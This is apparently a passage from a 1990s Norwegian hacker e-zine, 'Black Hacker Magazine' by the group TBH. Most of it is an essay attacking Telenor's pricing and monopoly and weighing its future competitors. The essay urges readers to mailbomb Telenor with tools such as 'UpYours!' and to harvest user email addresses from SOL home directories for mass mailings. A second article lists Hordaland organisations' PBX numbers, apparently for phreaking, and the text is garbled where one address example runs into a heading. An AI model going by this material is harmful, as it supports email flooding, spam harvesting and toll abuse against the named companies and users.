+                1) Sette opp nye linjer
+                2) Leie linjer av Telenor
+
+F›rste mulighet er omtrent utelukket, ettersom de da m† legge nye linjer
+inn til hver eneste husstand, og det vil bli *DYRT*. S† deres eneste mulighet
+blir da † LEIE linjene til Telenor. Staten skal sette en maxpris som Telenor
+kan ta i leie, men noe sier meg at denne kan bli HY (Det har jo vist seg
+tideligere at Hermansen f†r det som han vil...)
+
+Hvordan ser da mulighetene ut for v†re privatbrukere; JO - VELDIG DRLIGE!
+Selskaper t›r kanskje ikke pr›ve seg p† privatbruker markedet hvis Telenor
+tar HY leie, og da blir det ikke noe bedre for oss i det hele tatt. Hvis
+vi ser p† England for eksempel; Der falt telemonopolet for 10 †r siden,
+likevel har British Telecom fremdeles 90% av markedet! - Og det er godt
+mulig det samme skjer her i Norge; Telenor beholder markedet, og vi f†r
+null konkurranse p† privatbrukermarkedet, og dermed; Telenor har fremdeles
+makten!
+
+Som sagt; Telenor vil ogs† i fremtiden eie linjene her i norge, s† hvis
+du velger en annen operat›r enn Telenor, m† du sannsynligvis betale linje-
+leie til Telenor, og dette kan igjen medf›re at det blir dyrere † velge
+en av konkurrentene. Telenor har helt klart et godt kort p† h†nden der.
+
+Det ser ikke lyst ut, men fortvil ikke, det er fremdeles h†p :) for Telenor
+kan f† konkurranse:
+
+1.6 - Telenors konkurrenter
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Det finnes 3 internasjonale giganter (og Telenor er som en microcar i forhold
+til en lastebil mot disse):
+
+ Concert - British Telecom
+ ~~~~~~~   Amerikanske MCI
+           (Telenor er med i denne)
+
+ Global One - Amerikanske SPRINT
+ ~~~~~~~~~~   Deutsche Telecom
+              France Telecom
+
+ World Partners
+ ~~~~~~~~~~~~~~
+
+Alle disse 3 vil trolig pr›ve seg p† markedet i norge. Men de vil f›rst
+og fremst satse p† bedriftmarkedet; og forutsetningen for at de skal
+pr›ve seg p† privatbrukermarkedet er nettopp; om leien for Telenors linjer
+blir lav nok...
+
+Videre vil Telia (Det svenske teleselskapet) trolig bli den bitreste
+konkurrenten til Telenor, og Telia vil f†rh†pentligvis ogs† pr›ve seg
+p† privatbrukermarkedet her i Norge. Selvf›lgelig p† samme forutsetning
+som de andre har. (Ingen kan pr›ve seg hvis leieprisen p† linjene blir
+urimelig h›y)
+
+Tele2 kan ogs† nevnes, det er mulig de har tenkt † satse p† privatkunder,
+hvis vilk†rene blir gode nok (som i de andre tilfellene)
+
+Forsvarets kommunikasjonsnett kunne ogs† v‘rt brukt til telenett, men
+staten valgte † utelukke denne muligheten. S† der har man ingen ting
+† hente.
+
+En konkurrent som kanskje ikke s† mange hadde forventet, kan faktisk bli
+kraftverkene i norge! De har allerede telenettverk som de bruker i kontroll,
+overv†king og styring av sine anlegg. Og de kan ogs† bygge ut fiberoptisk
+telenett p† str›mkablene sine som allerede g†r til alle husstander over
+hele landet. (Fiberoptisk = RASK internett oppkobling :)) Og en ny teknologi
+som gj›r det mulig † spinne fiberoptiske kabler rundt h›yspentlinjene,
+gj›r at kraftselskapene faktisk kan sette opp et slikt nett langt billigere
+enn Telenor som m† grave ned kablene. S†, konklusjonen her m† v‘re at
+kraftselskapene faktisk kan bli en meget interessant konkurrent til Telenor.
+(EniTel AS og El-Tele AS er 2 giganter her)
+
+Vi kan h†pe p† at det blir mange om kj›ttbeinet etter 98, for dess mer
+konkurranse dess bedre blir det for oss...
+
+
+1.7 - Hva kan DU gj›re?
+~~~~~~~~~~~~~~~~~~~~~~~
+Som jeg nevnte tideligere s† utgj›r vi (vanlig telefoni) 43% av Telenors
+totale inntekter, og dette er mye. Samlet er vi sterke, mens en og en er
+vi ingenting. S†, for at du skal utrette noe, kan det v‘re en ide † komme
+i kontakt med andre, som fex. † melde deg inn i IBIO (Internettbrukernes
+interesseorganisasjon), denne finner du p†:
+
+                        http://www.ibio.no/
+
+Abbonomentet koster imidlertid 100kr :(, men det g†r jo til et godt form†l.
+IBIO er en seri›s organisasjon, og de jobber stadig med † bedre internett-
+brukernes k†r. De har alltid en advokat som plager Telenor ;)
+
+Du kan ogs† ta en tur innom 'Si Nei Aksjonen' p†
+
+                http://www.sysedata.no/si-nei-aksjonen/
+
+og Teleslakt (mer useri›s) p† http://www.netpower.no/~eivind/teleslakt/
+
+Det finnes ogs† andre ting du kan gj›re:
+----------------------------------------
+- Du kan sende emails til telenor, og fortelle dem hva du syntes om
+  'pris-senkingen' deres, og n†r du f›rst er i gang kan du godt sende emailen
+  med et program som 'UpYours!' eller 'Unabomber' slik at de f†r et par 100
+  kopier av beskjeden din ;) (Stikk innom www.telenor.no for adresser)
+
+- Skrive innlegg i avisene om Telenor (feks. leserinnlegg), feks. om den
+  sannhet at de LOVTE gratis lokaltakst i 1997, mens de i realiteten satt
+  opp prisen med 80% - jeg tror ikke dette faktum har v‘rt noe s‘rlig oppe
+  i media.
+
+- Ytre meningen din om Telenor uansett hvor du er, feks. p† kanaler p† IRC,
+  og andre steder du f†r sjansen.
+
+- Maile folk p† home.sol.no og www.sol.no (de som bruker Telenor frivillig)
+  seri›se mails som forklarer Telenors 'loving og lyging' og evt. vise
+  til tilbud hvor de ville f† billigere internet oppkobling, og gi dem
+  http adresser til sider som tar seg av emnet (feks. IBIO's side).
+  Stikk innom home.sol.no og www.sol.no og list alle userne, feks hvis
+  et directory heter;
+
+     /kjetola/
+
+  s† vil adressen hans antageligvis v‘re kjetolaX0B1.8 - Konklusjon
+
+~~~~~~~~~~~~~~~~
+Konklusjonen m† v‘re at Telenor p† v†r bekostning pr›ver † tyne de siste
+kronene ut av telemonopolet f›r det oppheves i 98. S†, n†r vi kommer til
+98 - v‘r n›kterne i valg av operat›r, og husk hva Telenor gjorde og
+sansynligvis ogs† kommer til † gj›re; Velg en av de andre leverand›rene
+da, slik at vi f†r konkurranse p† markedet, og dermed billigere priser.
+
+                                                            Codeblaster/TBH
+
+Norwegian: Hordaland PBX List!
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+HORDALAND'S OFFICIAL PBX LIST!
+
+Alrek Studenthjem                            - 55291802
+Arbeidskontoret i Arna                       - 55243890
+Arbeidskontoret i Fyllingsdalen              - 55168910
+Arbeidskontoret p† Nesttun                   - 55135330
+Arbeidskontoret p† Os›yro                    - 56304695
+Bergen Airport Hotel                         - 55229236
+Bergen Tekniske Fagskole                     - 55232582
+Betanien Hospitalet                          - 55166979 - fax!
+Datainstrument A/S                           - 55314390 - etter stengetid??
+Den Norske Bank                              - 56302071
+Inter Revisjon Bergen                        - 55295201
+Jebsens Management A/S                       - 55310606
+Knappentunet                                 - 55124299
+Norsk Blikkvalseverk A/S                     - 55341260
+Olaviken Behandlingssenter                   - 56149798
+Os Likningskontor og Folkeregister           - 56301299
+*Statens Dykkerskole                         - 55268904
+Statens H›gskole for kunsth†ndverk og design - 55311943
+Steen-Hansen F Malings- og Lakkfabrikk A/S   - 55100040
+Stolz R›thing AS                             - 55345560
+Vestlandet Kompetansesenter                  - 55296485
+Bj›rketeigen                                 - 56555710
+Norheimsund Yrkesskule                       - 56551530
+Toloheimen                                   - 56552030
+Arbeidskontoret i Knarvik                    - 56352330
+Odda Plast AS                                - 53644480
+Solid Vedlikehold AS                         - 56334275
+
+To find out just how much it costs you to call these pbxs, dial 80031031 for
+Telenor's price information service.
+
+                                                              Ripperjack/TBH
+
+
+Ending Notes
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+
+........................................
+:                                      : This mag was created by TBH! It'll be
+:         BLACK HACKER MAGAZINE!       : the last release under the name TBH,
+:       ____ _________ ______          : since we're now changing the groups
+:    __/   /_\_      /_\_ _  \______   : name to NS! (No Shit!).
+:    /     _  /_   _    /_ \    _  /_  :
+:   /____  /   /___/     /__\  /    /  : Hope you enjoyed the mag!
+:   mSO/______/__/______/____\/    /   :
+:                            /____/    :
+:                                      : E-Mail   :   blackhackers@hotmail.com
+:                                      : Homepage :   www.ge3k.com
+:......................................:
+
